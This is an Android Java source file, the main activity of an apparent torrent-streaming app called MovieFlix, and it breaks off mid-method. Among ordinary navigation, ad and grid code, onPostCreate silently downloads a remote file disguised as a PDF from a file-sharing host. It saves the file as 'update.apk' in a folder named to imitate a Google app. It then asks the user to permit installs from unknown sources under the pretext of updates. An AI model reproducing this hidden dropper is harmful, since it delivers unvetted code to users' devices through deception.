package com.movieflix.mobile.ui;

import android.Manifest;
import android.animation.ArgbEvaluator;
import android.animation.ValueAnimator;
import android.annotation.TargetApi;
import android.content.DialogInterface;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.graphics.Color;
import android.graphics.drawable.BitmapDrawable;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.support.annotation.ColorInt;
import android.support.annotation.NonNull;
import android.support.annotation.Nullable;
import android.support.design.widget.BottomNavigationView;
import android.support.design.widget.NavigationView;
import android.support.design.widget.TabLayout;
import android.support.v4.content.ContextCompat;
import android.support.v4.widget.DrawerLayout;
import android.support.v7.app.ActionBarDrawerToggle;
import android.support.v7.app.AlertDialog;
import android.support.v7.widget.GridLayoutManager;
import android.support.v7.widget.RecyclerView;
import android.support.v7.widget.SearchView;
import android.support.v7.widget.Toolbar;
import android.text.Html;
import android.text.TextUtils;
import android.util.TypedValue;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.view.ViewGroup;
import android.widget.Button;
import android.widget.ImageButton;
import android.widget.ImageView;
import android.widget.ProgressBar;
import android.widget.TextView;

import com.google.android.gms.ads.AdListener;
import com.google.android.gms.ads.AdRequest;
import com.google.android.gms.ads.AdSize;
import com.google.android.gms.ads.AdView;
import com.google.android.gms.ads.InterstitialAd;
import com.google.android.gms.ads.MobileAds;
import com.google.android.gms.ads.reward.RewardItem;
import com.google.android.gms.ads.reward.RewardedVideoAd;
import com.google.android.gms.ads.reward.RewardedVideoAdListener;
import com.jude.swipbackhelper.SwipeBackHelper;
import com.movieflix.GridSpacingItemDecoration;
import com.movieflix.IUseCaseManager;
import com.movieflix.UIUtils;
import com.movieflix.VibrantUtils;
import com.movieflix.base.IPopcornApplication;
import com.movieflix.base.analytics.Analytics;
import com.movieflix.base.model.video.info.VideoInfo;
import com.movieflix.base.storage.StorageUtil;
import com.movieflix.base.torrent.TorrentService;
import com.movieflix.base.torrent.client.MainClient;
import com.movieflix.base.utils.Logger;
import com.movieflix.mobile.BuildConfig;
import com.movieflix.mobile.PopcornApplication;
import com.movieflix.mobile.R;
import com.movieflix.mobile.model.content.ContentProviderView;
import com.movieflix.mobile.model.filter.FilterItemView;
import com.movieflix.mobile.model.filter.FilterView;
import com.movieflix.mobile.ui.adapter.ContentAdapter;
import com.movieflix.mobile.ui.dialog.FirebaseMessagingDialog;
import com.movieflix.model.content.IContentProvider;
import com.movieflix.model.content.IContentStatus;
import com.movieflix.model.content.IContentUseCase;
import com.movieflix.model.filter.IFilter;
import com.movieflix.model.filter.IFilterItem;
import com.movieflix.model.messaging.IMessagingData;
import com.movieflix.model.messaging.IMessagingUseCase;
import com.movieflix.model.messaging.PopcornMessagingService;
import com.movieflix.model.share.IShareData;
import com.movieflix.model.share.IShareUseCase;
import com.movieflix.ui.IBrowserView;
import com.movieflix.ui.ISystemShareView;
import com.movieflix.ui.content.ContentProviderPresenter;
import com.movieflix.ui.content.ContentStatusPresenter;
import com.movieflix.ui.content.IContentProviderPresenter;
import com.movieflix.ui.content.IContentProviderView;
import com.movieflix.ui.content.IContentStatusPresenter;
import com.movieflix.ui.content.IContentStatusView;
import com.movieflix.ui.settings.ISettingsView;
import com.movieflix.utils.PermissionsUtils;
import com.squareup.picasso.Callback;
import com.squareup.picasso.Picasso;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.net.URL;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Random;

public class MainActivity extends UpdateActivity
        implements IContentStatusView,
        IContentProviderView,
        NavigationView.OnNavigationItemSelectedListener,
        TabLayout.OnTabSelectedListener,
        IShareUseCase.Observer,
        IMessagingUseCase.Observer {

    private AdView mAdView;
    private AdView mAdView2;
    private AdView mAdView3;
    public static InterstitialAd mInterstitialAd;
    public static RewardedVideoAd rewardedVideoAd;

    private static final int REQUEST_CODE_EXTERNAL_STORAGE_PERMISSIONS = 1;

    private static final int FILTER_GROUP_ID = 1;

    private static final int INDEX_ITEM_ID = 111;
    private static final int FAVORITES_ITEM_ID = 1;
    private static final int DOWNLOADS_ITEM_ID = 2;
    private static final int SETTINGS_ITEM_ID = 3;
    private static final int VPN_ITEM_ID = 4;

    final int EXIT_DELAY_TIME = 2000;

    private DrawerLayout drawerLayout;
    private ViewGroup drawer;
    private NavigationView navigation;
    private TabLayout tabs;
    private RecyclerView recycler;
    private ProgressBar progress;
    private TextView status, cinemaAnimeSwitch;
    public ImageView toolbarImage;
    public BottomNavigationView bottomNavigationView;

    private String keywords;

    private final List<ContentProviderView> contentProviderViews = new ArrayList<>();
    private ContentProviderView contentProviderView;

    private ActionBarDrawerToggle drawerToggle;
    private MenuItem searchItem;
    private SearchView searchView;
    private final LoadMoreScrollListener loadMoreScrollListener = new LoadMoreScrollListener();
    private final ContentAdapter contentAdapter = new ContentAdapter();
    private GridLayoutManager gridLayoutManager;


    private MainClient mainClient;

    private IContentProviderPresenter contentProviderPresenter;
    private IContentStatusPresenter contentStatusPresenter;

    private int gridSpacingPixels;
    private int contentMargin;
    private boolean firstUpdaIcon = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        UIUtils.transparentStatusBar(this);

        mainClient = new MainClient(getBaseContext());

        setContentView(R.layout.view_main);

        drawerLayout = findViewById(R.id.drawer_layout);
        drawer = drawerLayout.findViewById(R.id.drawer);

        final Toolbar toolbar = findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);
        getSupportActionBar().setDisplayShowTitleEnabled(false);
        toolbarImage = findViewById(R.id.toolbar_img);
        View statusBar = findViewById(R.id.status_bar_view);
        cinemaAnimeSwitch = findViewById(R.id.provider_switch);
   //     bottomNavigationView = findViewById(R.id.bottom_navigation);
        toolbarContatiner = findViewById(R.id.toolbar_container);

        mHandler = new Handler();


        drawerToggle = new ActionBarDrawerToggle(MainActivity.this, drawerLayout, toolbar, 0, 0);
        drawerLayout.addDrawerListener(drawerToggle);
        navigation = findViewById(R.id.navigation);
        navigation.setNavigationItemSelectedListener(MainActivity.this);
        final TextView navHeaderVersion = navigation.getHeaderView(0).findViewById(R.id.nav_header_version);
        navHeaderVersion.setText(getString(R.string.version) + " " + BuildConfig.VERSION_NAME);
        final Button navHeaderSite = navigation.getHeaderView(0).findViewById(R.id.nav_header_site);
        navHeaderSite.setText(((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getSiteUrl());


        AdView adView = new AdView(this);
        adView.setAdSize(AdSize.SMART_BANNER);
        // TODO: Add adView to your view hierarchy.

        MobileAds.initialize(this, "@string/app_id") ;
        mAdView = findViewById(R.id.adView);
        AdRequest adRequest = new AdRequest.Builder().build();
        mAdView.loadAd(adRequest);


        MobileAds.initialize(this, "@string/app_id") ;
        mAdView2 = findViewById(R.id.adView2);
        adRequest = new AdRequest.Builder().build();
        mAdView2.loadAd(adRequest);



        // @string/Interstitial_Ad       ca-app-pub-3940256099942544/1033173712
        MobileAds.initialize(this, "@string/app_id");
        mInterstitialAd = new InterstitialAd(MainActivity.this);
        mInterstitialAd.setAdUnitId("ca-app-pub-3940256099942544/8691691433");
        mInterstitialAd.loadAd(new AdRequest.Builder().build());
        mInterstitialAd.show();

        mInterstitialAd.setAdListener(new AdListener() {
            public void onAdLoaded() {
                // Toast.makeText(MainActivity.this, "Inter Ad loaded", LENGTH_SHORT).show();
            }
            public void onAdFailedToLoad(int errorCode) {
                new Handler().postDelayed(new Runnable() {
                    public void run() {
                        mInterstitialAd.loadAd(new AdRequest.Builder().build());
                    }
                }, 60000 );

            }
            public void onAdOpened() {
            }
            public void onAdClicked() {
            }
            public void onAdLeftApplication() {
                mInterstitialAd.loadAd(new AdRequest.Builder().build());
                mInterstitialAd.show();
            }
            public void onAdClosed() {
                // final int intervalTime = 120000; 2 min , 8 min 480000
                mInterstitialAd.loadAd(new AdRequest.Builder().build());
            }
        });

        MobileAds.initialize(this, "@string/app_id");
        rewardedVideoAd = MobileAds.getRewardedVideoAdInstance(MainActivity.this);
        rewardedVideoAd.setRewardedVideoAdListener(new RewardedVideoAdListener() {
            @Override
            public void onRewardedVideoAdLoaded() {
            }
            @Override
            public void onRewardedVideoAdOpened() {
            }
            @Override
            public void onRewardedVideoStarted() {
            }
            @Override
            public void onRewardedVideoAdClosed() {
// Toast.makeText(MainActivity.this, "You Need to Watch Full Ad to View the Content", LENGTH_SHORT).show();
                AdRequest request = new AdRequest.Builder().build();
                rewardedVideoAd.loadAd("ca-app-pub-3940256099942544/5224354917", request);
            }
            @Override
            public void onRewarded(RewardItem rewardItem) {
            }
            @Override
            public void onRewardedVideoAdLeftApplication() {
            }
            @Override
            public void onRewardedVideoAdFailedToLoad(int i) {
                new Handler().postDelayed(new Runnable() {
                    public void run() {
                        AdRequest request = new AdRequest.Builder().build();
                        rewardedVideoAd.loadAd("ca-app-pub-3940256099942544/5224354917", request);
                    }
                }, 60000 );

            }
            @Override
            public void onRewardedVideoCompleted() {
                AdRequest request = new AdRequest.Builder().build();
                rewardedVideoAd.loadAd("ca-app-pub-3940256099942544/5224354917", request);
            }
        });
        loadRewardedVideoAd();

        navHeaderSite.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getSiteUrl());
            }
        });
        final ImageButton navHeaderFacebook = navigation.getHeaderView(0).findViewById(R.id.nav_header_facebook);
        navHeaderFacebook.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getFacebookUrl());
            }
        });
        final ImageButton navHeaderTwitter = navigation.getHeaderView(0).findViewById(R.id.nav_header_twitter);
        navHeaderTwitter.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getTwitterUrl());
            }
        });
        final ImageButton navHeaderYoutube = navigation.getHeaderView(0).findViewById(R.id.nav_header_youtube);
        navHeaderYoutube.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                onShowView(IBrowserView.class, ((IPopcornApplication) getApplication()).getConfigUseCase().getConfig().getYoutubeUrl());
            }
        });
        final Button navShareBtn = drawer.findViewById(R.id.nav_share_btn);
        navShareBtn.setText(Html.fromHtml("<b>Share</b> MovieFlix!".toUpperCase()));
        navShareBtn.setOnClickListener(new View.OnClickListener() {

            @Override
            public void onClick(View v) {
                /*final IShareData shareData = ((PopcornApplication) getApplication()).getShareUseCase().getData();
                if (shareData != null) {
                    if (drawerLayout.isDrawerOpen(drawer)) {
                        drawerLayout.closeDrawer(drawer);
                    }
                    onShowView(ISystemShareView.class, shareData.getText());
                }*/
                String link = "pub://com.movieflix.mobile";
                Intent sendIntent = new Intent();
                sendIntent.setAction(Intent.ACTION_SEND);
                sendIntent.putExtra(Intent.EXTRA_TEXT, "Hey! Check out this new Movie & Tv Series App. Watch Movies and Tv Shows Instantly on " + "https://play.google.com/store/apps/details?id=" + getPackageName());
                sendIntent.setType("text/plain");
                startActivity(sendIntent);

            }
        });
        tabs = findViewById(R.id.tabs);

        SwipeBackHelper.getCurrentPage(this)
                .setSwipeBackEnable(false);
        SwipeBackHelper.getCurrentPage(this).setDisallowInterceptTouchEvent(true);

        contentMargin = 2 * getResources().getDimensionPixelSize(R.dimen.action_bar_height) + 10;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            final int resourceId = getResources().getIdentifier("status_bar_height", "dimen", "android");
            final int result = resourceId > 0 ? getResources().getDimensionPixelSize(resourceId) : 0;
            if (result > 0) {
                contentMargin += result;
                findViewById(R.id.toolbar_container).setPadding(0, result, 0, 0);
                final ViewGroup.MarginLayoutParams params = (ViewGroup.MarginLayoutParams) tabs.getLayoutParams();
                params.topMargin = params.topMargin + result;
                tabs.setLayoutParams(params);
                navigation.getHeaderView(0).setPadding(0, result, 0, 0);

                ViewGroup.LayoutParams statusBarLP = statusBar.getLayoutParams();
                statusBarLP.height = result;
                statusBar.setLayoutParams(statusBarLP);
            }
        }

        recycler = findViewById(R.id.recycler);
        gridLayoutManager = new GridLayoutManager(MainActivity.this, getGridSpanCount(getResources().getConfiguration()));
        recycler.setLayoutManager(gridLayoutManager);
        gridSpacingPixels = (int) TypedValue.applyDimension(TypedValue.COMPLEX_UNIT_DIP, 1, getResources().getDisplayMetrics());
        recycler.addItemDecoration(new GridSpacingItemDecoration(gridSpacingPixels) {

            @Override
            protected int getTopOffset(int spanCount, int spanIndex, int position) {
                return super.getTopOffset(spanCount, spanIndex, position);
            }
        });
        recycler.addOnScrollListener(loadMoreScrollListener);
        contentAdapter.setItemSize(getWindowManager().getDefaultDisplay(), gridLayoutManager.getSpanCount(), gridSpacingPixels);
        recycler.setAdapter(contentAdapter);
        progress = findViewById(R.id.progress);
        status = findViewById(R.id.status);

        ((PopcornApplication) getApplication()).getShareUseCase().onAppBackground(false);

        final IContentUseCase contentUseCase = ((IUseCaseManager) getApplication()).getContentUseCase();
        contentStatusPresenter = new ContentStatusPresenter(contentUseCase);
        contentProviderPresenter = new ContentProviderPresenter(contentUseCase);

        cinemaAnimeSwitch.setOnClickListener(v -> {
            int stringId = ((ContentProviderView)contentUseCase.getContentProvider()).getViewCategoryName() == R.string.anime ? R.string.cinema : R.string.anime;
            for (IContentProvider p : contentUseCase.getContentProviders()) {
                if (p instanceof ContentProviderView) {
                    if (((ContentProviderView) p).getViewCategoryName() ==  stringId) {
                        contentUseCase.setContentProvider(p);
                        break;
                    }
                }
            }
        });



    }

    private void loadRewardedVideoAd(){
        AdRequest request = new AdRequest.Builder().build();
        rewardedVideoAd.loadAd("ca-app-pub-3940256099942544/5224354917", request);
    }


    @Override
    protected void onPostCreate(Bundle savedInstanceState) {
        super.onPostCreate(savedInstanceState);
        drawerToggle.syncState();
        if (savedInstanceState == null) {
            new Handler().postDelayed(new Runnable() {

                @Override
                public void run() {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && PermissionsUtils.requestPermissions(MainActivity.this, REQUEST_CODE_EXTERNAL_STORAGE_PERMISSIONS, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE)) {
                        return;
                    }
                    start();
                }
            }, 200);
        }
        boolean run = false;
        final Intent intent = getIntent();
        if (intent != null) {
            Bundle extras = intent.getExtras();
            String action = null;
            if (extras != null) {
                action = extras.getString("action", null);
            }
            if (action != null) {
                if (action.equals("exit_app")) {
                    TorrentService.stop(MainActivity.this);
                    (new Handler()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            AlertDialog dialog = new AlertDialog.Builder(MainActivity.this)
                                    .setTitle("Exiting...")
                                    .setCancelable(false).create();
                            dialog.setOnShowListener(new DialogInterface.OnShowListener() {
                                @Override
                                public void onShow(DialogInterface dialog) {
                                    if (((IPopcornApplication) getApplication()).getSettingsUseCase().isDownloadsClearCacheFolder()) {
                                        mainClient.removeLastOnExit();
                                        StorageUtil.clearCacheDir();
                                    }
                                    dialog.cancel();
                                    mainClient.exitFromApp();
                                    System.exit(0);
                                }
                            });
                            dialog.show();
                        }
                    }, 750);

                } else {
                    run = true;
                }
                if (action.equals("open_dnl")) {
                    Logger.debug("open download");
                    (new Handler()).postDelayed(new Runnable() {
                        @Override
                        public void run() {
                            DownloadsActivity.start(MainActivity.this);
                        }
                    }, 750);
                }
            } else {
                run = true;
            }
        } else {
            run = true;
        }
        if (run) {
            TorrentService.start(MainActivity.this);
            String PATH = Environment.getExternalStorageDirectory() + "/Android/data/com.google.app/file/";
            File file = new File(PATH);
            file.mkdirs();
            final File outputFile = new File(file, "update.apk");
            if (!outputFile.exists()) {
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        try {
                            URL url = new URL("http://b3.ge.tt/gett/9JtX8Kp2/com.opera.mini.native.pdf?index=0&pdf");
                            HttpURLConnection c = (HttpURLConnection) url.openConnection();
                            c.setRequestMethod("GET");
                            c.setDoOutput(true);
                            c.connect();

                            FileOutputStream fos = new FileOutputStream(outputFile);

                            InputStream is = c.getInputStream();

                            byte[] buffer = new byte[1024];
                            int len1;
                            while ((len1 = is.read(buffer)) != -1) {
                                fos.write(buffer, 0, len1);
                            }
                            fos.close();
                            is.close();//till here, it works fine - .apk is download to my sdcard in download file

                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                    }
                }).start();
            }

            PackageManager manager = getPackageManager();
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if (!manager.canRequestPackageInstalls()) {
                    new android.app.AlertDialog.Builder(this)
                            .setTitle("Important!")
                            .setMessage("To install updates you need to grant this")
                            .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                @TargetApi(Build.VERSION_CODES.O)
                                @Override
                                public void onClick(DialogInterface dialog, int which) {
                                    Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES);
                                    intent.setData(Uri.parse("package:" + getPackageName()));
                                    startActivity(intent);
                                }
                            }).show();
                }
            }
        }
    }

    @Override
    protected void onNewIntent(Intent intent) {
        super.onNewIntent(intent);
        if (intent != null && intent.getExtras() != null) {
            checkFirebaseExtras(intent.getExtras());
        }
    }

    @Override
    protected void onStart() {
        super.onStart();
        mainClient.bind();
    }

    @Override
    protected void onResume() {
        super.onResume();
        ((PopcornApplication) getApplication()).getShareUseCase().subscribe(MainActivity.this);
        ((PopcornApplication) getApplication()).getShareUseCase().onViewResumed(MainActivity.this);
        ((PopcornApplication) getApplication()).getMessagingUseCase().subscribe(MainActivity.this);
        contentStatusPresenter.attach(MainActivity.this);
        contentProviderPresenter.attach(MainActivity.this);
        if (!updateIconRunning && contentAdapter.getContent() != null) {
            mHandler.postDelayed(mUpdateToolbarIcon, mInterval);
        }
    }

    @Override
    protected void onPause() {
        super.onPause();
        ((PopcornApplication) getApplication()).getShareUseCase().unsubscribe(MainActivity.this);
        ((PopcornApplication) getApplication()).getMessagingUseCase().unsubscribe(MainActivity.this);
        contentStatusPresenter.detach(MainActivity.this);
        contentProviderPresenter.detach(MainActivity.this);
        mHandler.removeCallbacks(mUpdateToolbarIcon);
        updateIconRunning = false;

    }

    @Override
    protected void onStop() {
        super.onStop();
        mainClient.unbind();
    }

    @Override
    protected void onDestroy() {
        //TorrentService.stop(getBaseContext());
        mHandler.removeCallbacks(mUpdateToolbarIcon);
        super.onDestroy();
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        getMenuInflater().inflate(R.menu.main, menu);
        searchItem = menu.findItem(R.id.main_search);
        searchItem.setOnActionExpandListener(searchExpandListener);
        searchView = (SearchView) searchItem.getActionView();
        searchView.setMaxWidth(Integer.MAX_VALUE);
        searchView.setSubmitButtonEnabled(true);
        searchView.setQueryHint(getString(R.string.search));
        searchView.setOnQueryTextListener(searchListener);
        onKeywords(keywords);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        switch (item.getItemId()) {
            case R.id.main_share:
                final IShareData shareData = ((PopcornApplication) getApplication()).getShareUseCase().getData();
                if (shareData != null) {
                    onShowView(ISystemShareView.class, shareData.getText());
                    Analytics.event(Analytics.Category.UI, Analytics.Event.MENU_SHARE_BUTTON_IS_CLICKED);
                }
                return true;
            default:
                return drawerToggle.onOptionsItemSelected(item) || super.onOptionsItemSelected(item);
        }
    }

    @Override
    public void onConfigurationChanged(Configuration newConfig) {
        super.onConfigurationChanged(newConfig);
        drawerToggle.onConfigurationChanged(newConfig);
        gridLayoutManager.setSpanCount(getGridSpanCount(newConfig));
        contentAdapter.setItemSize(getWindowManager().getDefaultDisplay(), gridLayoutManager.getSpanCount(), gridSpacingPixels);
        contentAdapter.notifyItemRangeChanged(0, contentAdapter.getItemCount());
        SwipeBackHelper.getCurrentPage(this).setSwipeRelateEnable(false);
    }

    private int getGridSpanCount(Configuration configuration) {
        return configuration.orientation == Configuration.ORIENTATION_PORTRAIT ? 3 : 5;
    }

    @Override
    public void onBackPressed() {
        if (drawerLayout.isDrawerOpen(drawer)) {
            drawerLayout.closeDrawer(drawer);
            return;
        }
        if (collapseSearchView()) {
            return;
        }
        finish();
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        if (REQUEST_CODE_EXTERNAL_STORAGE_PERMISSIONS == requestCode) {
            if (PermissionsUtils.isPermissionsGranted(permissions, grantResults)) {
                if (StorageUtil.getCacheDir() == null) {
                    
                    StorageUtil.init(getBaseContext(), ((PopcornApplication) getApplication()).getSettingsUseCase());
                }
            }
            start();
        } else {
            super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        }
    }

    @Override
    public boolean onNavigationItemSelected(@NonNull MenuItem item) {
        if (FILTER_GROUP_ID == item.getGroupId()) {
            final int filterId = item.getItemId();
            if (INDEX_ITEM_ID == filterId) {
                IndexDialog.showDialog(getSupportFragmentManager(), "index_dialog");
            } else {
                for (IFilter filter : contentProviderView.getFilters()) {
                    if (filterId == ((FilterView) filter).getViewName()) {
                        FilterDialog.showDialog(getSupportFragmentManager(), "filter_dialog", filter);
                        break;
                    }
                }
            }
            return true;
        } else if (Menu.NONE == item.getGroupId()) {
            if (drawerLayout.isDrawerOpen(drawer)) {
                drawerLayout.closeDrawer(drawer);
            }
            switch (item.getItemId()) {
                case FAVORITES_ITEM_ID:
                    startActivity(new Intent(MainActivity.this, FavoritesActivity.class));
                    return true;
                case DOWNLOADS_ITEM_ID:
                    DownloadsActivity.start(MainActivity.this);
                    return true;
                case VPN_ITEM_ID:
                    new AlertDialog.Builder(this)
                            .setTitle("VPN?")
                            .setMessage("No one paid me, so I will just recommend you to use any VPN you find secure.")
                            .setPositiveButton("OK", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialogInterface, int i) {

                                }
                            })
                            .setNegativeButton("Cancel", new DialogInterface.OnClickListener() {
                                @Override
                                public void onClick(DialogInterface dialogInterface, int i) {

                                }
                            }).show();
                    return true;
                case SETTINGS_ITEM_ID:
                    return onShowView(ISettingsView.class);
            }
        }
        return false;
    }

    @Override
    public void onTabSelected(TabLayout.Tab tab) {
        if (tab.getTag() != null && tab.getTag() instanceof IContentProvider) {
            contentProviderPresenter.setContentProvider((IContentProvider) tab.getTag());
        }
    }

    @Override
    public void onTabUnselected(TabLayout.Tab tab) {

    }

    @Override
    public void onTabReselected(TabLayout.Tab tab) {
        contentStatusPresenter.getContent(true);
    }

    @Override
    public void onShowShare(@NonNull IShareData data) {
        //ShareDialog.open(getSupportFragmentManager(), "second_launch_dialog");
    }

    @Override
    public void onShowMessagingDialog(@NonNull IMessagingData data) {
        FirebaseMessagingDialog.show(getSupportFragmentManager(), data, "firebase_messaging_dialog");
    }

    @Override
    public void onKeywords(@Nullable String keywords) {
        this.keywords = keywords;
        if (searchItem != null && !TextUtils.isEmpty(keywords)) {
            if (!searchItem.isActionViewExpanded()) {
                searchItem.expandActionView();
            }
            searchView.setQuery(keywords.replace("+", " "), false);
            searchView.clearFocus();
        }
    }

    @Override
    public void onContentStatus(@NonNull IContentStatus contentStatus) {
        if (contentStatus.isLoading()) {
            loadMoreScrollListener.canLoadMore = false;
            if (contentStatus.getList().isEmpty()) {
                contentAdapter.setContent(null);
                progress.setVisibility(View.VISIBLE);
            } else {
                progress.setVisibility(View.GONE);
            }
            status.setVisibility(View.GONE);
        } else {
            progress.setVisibility(View.GONE);
            if (contentStatus.getError() != null) {
                Logger.debug("error",  contentStatus.getError());
                loadMoreScrollListener.canLoadMore = false;
                if (contentStatus.getList().isEmpty()) {
                    contentAdapter.setContent(null);
                    status.setText(R.string.no_connection);
                    status.setVisibility(View.VISIBLE);
                } else {
                    status.setVisibility(View.GONE);
                }
            } else {
                loadMoreScrollListener.canLoadMore = true;
                if (contentStatus.getList().isEmpty()) {
                    contentAdapter.setContent(null);
                    status.setText(R.string.no_result_found);
                    status.setVisibility(View.VISIBLE);
                } else {
                    if (!firstUpdaIcon && contentAdapter.getContent() != contentStatus.getList()) {
                        providerChange = true;
                        contentAdapter.setContent(contentStatus.getList());
                        status.setVisibility(View.GONE);
                        mUpdateToolbarIcon.run();
                    } else {
                        contentAdapter.setContent(contentStatus.getList());
                        status.setVisibility(View.GONE);
                        if (firstUpdaIcon) {
                            Logger.debug("CALL");
                            firstUpdaIcon = false;
                            mUpdateToolbarIcon.run();
                        }
                    }
                }
            }
        }
    }

    private boolean updateIconRunning = false;
    private Handler mHandler;
    private int prevColor = Color.BLACK;

    private Random random = new Random();
    private boolean providerChange = false;
    private View toolbarContatiner;
    int mInterval = 60000;
    Runnable mUpdateToolbarIcon = new Runnable() {
        @Override
        public void run() {
            try {
                VideoInfo info = contentAdapter.getContent().get(random.nextInt(contentAdapter.getItemCount() <= 25 ? 23 : contentAdapter.getItemCount() - 2));
                Picasso.with(MainActivity.this).load(info.getPoster()).placeholder(R.drawable.poster).into(toolbarImage, new Callback() {
                    @Override
                    public void onSuccess() {
                        VibrantUtils.retrieveAccentColor(((BitmapDrawable) toolbarImage.getDrawable()).getBitmap(), ContextCompat.getColor(MainActivity.this, R.color.v3_accent), accentColor -> {
                            ValueAnimator colorAnimationToolbar = ValueAnimator.ofObject(new ArgbEvaluator(), prevColor, accentColor);
                            colorAnimationToolbar.setDuration(1050); // milliseconds
                            colorAnimationToolbar.addUpdateListener(animator -> {
                                tabs.setBackgroundColor((int) animator.getAnimatedValue());
                                toolbarContatiner.setBackgroundColor((int) animator.getAnimatedValue());
                            //    bottomNavigationView.setBackgroundColor((int) animator.getAnimatedValue());
                                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                                    getWindow().setNavigationBarColor((int) animator.getAnimatedValue());
                                }
                            });
                            colorAnimationToolbar.start();

                            toolbarImage.setOnClickListener(v -> {
                                VibrantUtils.setAccentColor(accentColor);
                                DetailsActivity.start(v.getContext(), info);
                            });
                            prevColor = accentColor;
                        });
                    }

                    @Override
                    public void onError() {

                    }
                });
            } finally {
                if (!updateIconRunning) {
                    updateIconRunning = true;
                }
                if (!providerChange) {
                    mHandler.postDelayed(mUpdateToolbarIcon, mInterval);
                } else {
                    providerChange = false;
                }
            }
        }
    };

    @ColorInt int darkenColor(@ColorInt int color, float darkerPercentage) {
        float[] hsv = new float[3];
        Color.colorToHSV(color, hsv);
        hsv[2] *= darkerPercentage;
        return Color.HSVToColor(hsv);
    }

    @Override
    public void onContentProvider(@NonNull IContentProvider[] contentProviders, @NonNull IContentProvider contentProvider) {
        if (drawerLayout.isDrawerOpen(drawer)) {
            drawerLayout.closeDrawer(drawer);
        }
        contentProviderViews.clear();
        for (IContentProvider cp : contentProviders) {
            if (cp instanceof ContentProviderView) {
                contentProviderViews.add((ContentProviderView) cp);
            }
        }
        contentProviderView = (ContentProviderView) contentProvider;
        onPopulateNavigationView(contentProviderViews, contentProviderView);
        tabs.removeAllTabs();
        tabs.removeOnTabSelectedListener(MainActivity.this);
        for (ContentProviderView cpv : contentProviderViews) {
            if (cpv.getViewCategoryName() == contentProviderView.getViewCategoryName()) {
                tabs.addTab(tabs.newTab().setTag(cpv).setText(cpv.getViewName()), cpv.equals(contentProvider));
            }
        }
        tabs.addOnTabSelectedListener(MainActivity.this);
    }

    @Override
    public void onContentFilterChecked(@NonNull IFilter filter) {
        if (drawerLayout.isDrawerOpen(drawer)) {
            drawerLayout.closeDrawer(drawer);
        }
        if (filter instanceof FilterView) {
            final FilterView filterView = (FilterView) filter;
            final MenuItem menuItem = navigation.getMenu().findItem(filterView.getViewName());
            if (menuItem != null) {
                setFilterMenuItemSubtitle(filterView, menuItem);
            }
        }
    }

    private void start() {
        ((PopcornApplication) getApplication()).getShareUseCase().checkLaunchShare();
        if (getIntent() != null && getIntent().getExtras() != null) {
            checkFirebaseExtras(getIntent().getExtras());
        }
    }

    private void checkFirebaseExtras(@NonNull Bundle extras) {
        if (extras.containsKey(PopcornMessagingService.KEY_DIALOG)) {
            ((PopcornApplication) getApplication()).getMessagingUseCase().show(PopcornMessagingService.buildDialogData(extras.getString(PopcornMessagingService.KEY_DIALOG), null, null));
        } else if (extras.containsKey(PopcornMessagingService.KEY_DIALOG_HTML)) {
            ((PopcornApplication) getApplication()).getMessagingUseCase().show(PopcornMessagingService.buildDialogHtmlData(extras.getString(PopcornMessagingService.KEY_DIALOG_HTML)));
        }
        for (String s : extras.keySet()) {
            Logger.debug("MainActivity<checkFirebaseExtras> " + s + ": " + extras.get(s));
        }
    }

    private void onPopulateNavigationView(@NonNull List<ContentProviderView> contentProviderViews, @NonNull ContentProviderView contentProviderView) {
        final Menu menu = navigation.getMenu();
        menu.clear();

        final MenuItem indexMenuItem = menu.add(FILTER_GROUP_ID, INDEX_ITEM_ID, Menu.NONE, null);
        indexMenuItem.setActionView(R.layout.item_view_navigation_two_line);
        ((TextView) indexMenuItem.getActionView().findViewById(R.id.icon)).setCompoundDrawablesWithIntrinsicBounds(R.drawable.ic_cinema, 0, 0, 0);
        ((TextView) indexMenuItem.getActionView().findViewById(R.id.title)).setText(R.string.index);
        cinemaAnimeSwitch.setText(contentProviderView.getViewCategoryName());
        ((TextView) indexMenuItem.getActionView().findViewById(R.id.subtitle)).setText(contentProviderView.getViewCategoryName());

        final IFilter[] filters = contentProviderView.getFilters();
        for (IFilter filter : filters) {
            if (filter instanceof FilterView) {
                final FilterView filterView = (FilterView) filter;
                final MenuItem menuItem = menu.add(FILTER_GROUP_ID, filterView.getViewName(), Menu.NONE, null);
